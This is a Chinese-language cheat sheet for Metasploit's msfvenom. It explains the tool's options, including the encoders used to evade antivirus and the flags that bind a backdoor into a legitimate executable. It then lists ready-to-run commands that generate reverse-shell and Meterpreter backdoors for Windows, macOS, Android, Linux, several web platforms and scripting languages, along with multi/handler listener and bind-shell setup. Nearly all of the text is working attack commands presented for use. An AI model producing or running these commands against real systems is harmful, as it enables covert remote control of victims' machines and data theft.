kali中的msfvenom取代了msf中payloads和encoders模块
就是反弹上线后门程序。
## **msfvenom 常用参数**
-l
列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
-p
指定需要使用的payload(攻击荷载)。
-f
指定输出格式
Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；
Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js\_be、js\_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；
-e
指定需要使用的encoder（编码器）编码免杀。
-a
指定payload的目标架构
选择架构平台:x86 | x64 | x86\_64\
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe
-o
保存payload文件输出。
-b
设定规避字符集，比如: '\x00\xff'避免使用的字符
-n
为payload预先指定一个NOP滑动长度
-s
设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小。
-i
指定payload的编码次数
-c
指定一个附加的win32 shellcode文件
-x
指定一个自定义的可执行文件作为模板\
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。
-k
保护模板程序的动作，注入的payload作为一个新的进程运行\
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。
-v
指定一个自定义的变量，以确定输出格式

## **各平台生成payload命令**

（1）Windows

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse\_tcp

LHOST=192.168.3.33 LPORT=4444 -e x86/shikata\_ga\_nai -b '\x00\x0a\xff' -i 10 -f exe -o payload.exe

（2）Mac

msfvenom -a x86 --platform osx -p osx/x86/shell\_reverse\_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho

（3）Android

msfvenom -p android/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -o payload.apk

（4）Powershell

msfvenom -a x86 --platform Windows -p windows/powershell\_reverse\_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell\_base64 -i 3 -f raw -o payload.ps1

（5）Linux

msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf

（6）php

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f raw > shell.php
php后门监听也是php/meterpreter_reverse_tcp

（7）aspx

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx

（8）JSP

msfvenom --platform java -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.jsp

（9）war  jar

msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war
 
msfvenom -p java/meterpreter/reverse_tcp LHOST=IP地址 LPORT=端口 -f jar -o 1.jar


（10）nodejs

msfvenom -p nodejs/shell\_reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.js

（11）python

msfvenom -p python/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.py

（12）perl

msfvenom -p cmd/unix/reverse\_perl LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.pl

（13）ruby

msfvenom -p ruby/shell\_reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb

（14）lua

msfvenom -p cmd/unix/reverse\_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua

（15）windows shellcode

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f c

（16）linux shellcode

msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f c

（17）mac shellcode

msfvenom -a x86 --platform osx -p osx/x86/shell\_reverse\_tcp LHOST=192.168.1.1 LPORT=4567 -f c



## **监听上线**
生成反向
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.168 LPORT=4444 -f exe -o bd.exe
windows/x64/meterpreter/reverse_tcp

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.113.129.57 LPORT=5555 -f elf > chenjie.elf
```


监听
```
use exploit/multi/handler
使用对应监听模块
set payload windows/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp

set lhost 0.0.0.0
set lport 4444
run
```
目标机上线后进入会话

后台运行会话
meterpreter>background

查看有哪些会话
msf>sessions

进入会话
msf>sessions 1


## **正向后门**
后门监听端口meterpreter/bind

```
msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe -o bd.exe
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > 2.elf

主动监听连接：
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set rhost 目标ip
set lport  后门端口
run
此时sessions可以看到新上线。

主动监听连接：
background
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.55.131                   
set LPORT 4444
run
```








